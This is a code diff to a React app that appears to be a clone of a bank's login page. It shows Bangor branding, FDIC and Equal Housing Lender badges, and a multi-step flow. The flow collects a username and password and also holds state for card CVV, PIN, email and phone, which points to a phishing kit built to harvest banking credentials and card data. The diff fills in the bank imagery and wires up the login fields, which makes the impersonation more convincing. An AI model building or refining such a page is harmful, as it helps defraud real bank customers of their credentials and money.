@@ -1,8 +1,12 @@
 import React, { useState, useEffect } from "react";
 import "./App.css";
+import bannerImg from "./assets/banner.jpg";
+import fdicImg from "./assets/fdic.png";
+import memberFdicImg from "./assets/member-fdic.png";
+import equalHousingImg from "./assets/equal-housing.png";
 
 // Placeholder image imports (replace with your actual assets later)
-const bangorLogo = "./assets/bangor-logo.png"; // e.g. require("./assets/bangor-logo.png")
+const bangorLogo = ""; // e.g. require("./assets/bangor-logo.png")
 
 function Stepper({ step }) {
   return (
@@ -95,6 +99,10 @@ function StepPage({ step, onNext, onPrev }) {
   const [cvv, setCvv] = useState("");
   const [pin, setPin] = useState("");
 
+  // State for login
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
+
   // Simple validation
   const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
   const phoneValid = /^\d{3}-\d{3}-\d{4}$/.test(phone);
@@ -107,7 +115,7 @@ function StepPage({ step, onNext, onPrev }) {
         {/* Top banner image */}
         <div style={{ width: "100%", height: 220, background: "#eee", overflow: "hidden", margin: "0 auto 24px auto" }}>
           <img
-            src=""
+            src={bannerImg}
             alt="Banner"
             style={{ width: "100%", height: "100%", objectFit: "cover" }}
           />
@@ -126,7 +134,7 @@ function StepPage({ step, onNext, onPrev }) {
           display: "flex", alignItems: "center", border: "1px solid #222", borderRadius: 10,
           padding: 12, marginBottom: 24, background: "#fff"
         }}>
-          <img src="" alt="FDIC" style={{ width: 32, height: 32, marginRight: 12 }} />
+          <img src={fdicImg} alt="FDIC" className="fdic-logo" />
           <span style={{ fontSize: 16, color: "#222" }}>
             FDIC-Insured - Backed by the full faith and credit of the U.S. Government
           </span>
@@ -143,9 +151,10 @@ function StepPage({ step, onNext, onPrev }) {
               placeholder=""
               className="login-input"
               style={{
-                // Remove width: "100%"
                 flex: 1, border: "none", outline: "none", fontSize: 20, background: "transparent", height: 56
               }}
+              value={username}
+              onChange={e => setUsername(e.target.value)}
             />
             <span style={{ fontSize: 18, marginRight: 8, color: "#222" }}>Save</span>
             <label className="switch">
@@ -166,9 +175,10 @@ function StepPage({ step, onNext, onPrev }) {
               placeholder=""
               className="login-input"
               style={{
-                // Remove width: "100%"
                 flex: 1, border: "none", outline: "none", fontSize: 20, background: "transparent", height: 56
               }}
+              value={password}
+              onChange={e => setPassword(e.target.value)}
             />
             <span style={{ cursor: "pointer", marginLeft: 8 }}>
               {/* Eye icon SVG */}
@@ -184,10 +194,10 @@ function StepPage({ step, onNext, onPrev }) {
           onClick={onNext}
           className="login-btn"
           style={{
-            // Remove width: "100%"
             background: "#888be9", color: "#fff", fontSize: 28, border: "none",
             borderRadius: 8, padding: "16px 0", marginBottom: 24, fontWeight: 400
           }}
+          disabled={username.trim() === "" || password.trim() === ""}
         >
           Login
         </button>
@@ -200,8 +210,8 @@ function StepPage({ step, onNext, onPrev }) {
         </div>
         {/* Footer logos */}
         <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 16, marginTop: 24 }}>
-          <img src="" alt="FDIC" style={{ height: 48 }} />
-          <img src="" alt="Equal Housing Lender" style={{ height: 48 }} />
+          <img src={memberFdicImg} alt="FDIC" style={{ height: 108 }} />
+          <img src={equalHousingImg} alt="Equal Housing Lender" style={{ height: 68 }} />
         </div>
       </>
     );
